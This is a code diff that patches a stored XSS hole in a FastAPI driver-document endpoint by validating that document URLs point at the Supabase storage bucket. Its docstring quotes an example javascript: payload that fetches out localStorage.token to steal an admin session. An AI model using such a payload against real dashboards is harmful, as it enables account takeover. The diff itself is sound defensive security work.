@@ -7,7 +7,7 @@ from typing import Any, Dict, Optional
 
 from fastapi import APIRouter, Depends, File, Form, HTTPException, Query, Request, UploadFile
 from loguru import logger
-from pydantic import BaseModel
+from pydantic import BaseModel, field_validator
 
 try:
     from . import db_supabase
@@ -127,12 +127,49 @@ class UpdateRequirementRequest(BaseModel):
     requires_back_side: Optional[bool] = None
 
 
+def _validate_storage_document_url(url: str) -> str:
+    """Reject any document_url that is not a Supabase storage URL for the
+    driver-documents bucket.
+
+    LinkDocumentRequest.document_url was a bare str written verbatim to
+    driver_documents.document_url and later rendered as an <a href> in the admin
+    dashboard. Any authenticated user can reach POST /drivers/documents (it
+    auto-creates a driver row), so a value like
+    javascript:fetch('…'+localStorage.token) executed on the admin origin with
+    the admin session when a reviewer clicked "view" — stored XSS → admin token
+    theft. Constrain the value to https on the configured Supabase host with the
+    expected storage object path so only a genuine uploaded file can be linked.
+    """
+    from urllib.parse import urlparse
+
+    parsed = urlparse((url or "").strip())
+    if parsed.scheme != "https":
+        raise ValueError("document_url must be an https Supabase storage URL")
+    # Path must be a storage object in the driver-documents bucket.
+    if not _re.match(r"^/storage/v1/object/(?:sign|public)/driver-documents/", parsed.path):
+        raise ValueError("document_url must point at the driver-documents storage bucket")
+    # Host must match the configured Supabase project when known (always set in
+    # production; startup fails without it). Falls back to the path check alone
+    # in dev where SUPABASE_URL may be unset.
+    supabase_url = os.environ.get("SUPABASE_URL", "").strip()
+    if supabase_url:
+        expected_host = urlparse(supabase_url).netloc
+        if expected_host and parsed.netloc != expected_host:
+            raise ValueError("document_url host is not the configured Supabase project")
+    return url
+
+
 class LinkDocumentRequest(BaseModel):
     requirement_id: str
     document_url: str
     document_type: str = "image/jpeg"
     side: Optional[str] = "front"
     expiry_date: Optional[datetime] = None
+
+    @field_validator("document_url")
+    @classmethod
+    def _check_document_url(cls, v: str) -> str:
+        return _validate_storage_document_url(v)
 
 
 class DriverDocument(BaseModel):
